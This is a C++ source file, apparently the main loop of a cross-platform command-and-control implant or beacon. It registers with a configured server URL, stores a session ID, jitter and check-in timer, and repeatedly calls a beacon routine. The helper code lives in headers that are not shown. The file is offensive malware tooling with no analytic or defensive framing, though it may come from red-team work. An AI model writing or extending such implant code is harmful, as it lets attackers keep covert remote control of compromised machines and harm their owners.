#include <iostream>
#include <string>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>

#include "Generic/config.hpp"
#include "Generic/httpRequests.hpp"

#ifdef __unix__
#include "Linux/generic.hpp"
#endif
#ifdef _WIN32
#include "Windows/generic.hpp"
#endif

int main() {
    while (true) {
        try {
            if (ID != "" && JITTER != -1 && TIMER != -1) {
                auto result = httpReconnect(URL, ID, JITTER, TIMER);
                if (std::get<0>(result) == -1) {
                    continue;
                }
            } else {
                auto result = httpConnection(URL);
                if (std::get<0>(result) == -1) {
                    continue;
                }
                TIMER = std::get<0>(result);
                ID = std::get<1>(result);
                JITTER = std::get<2>(result);
            }
            int err = beacon();
            if (err == -1) {
                continue;
            }


        } catch (const std::exception& e) {
            std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
            return 1;
        }
    }
    return 0;
}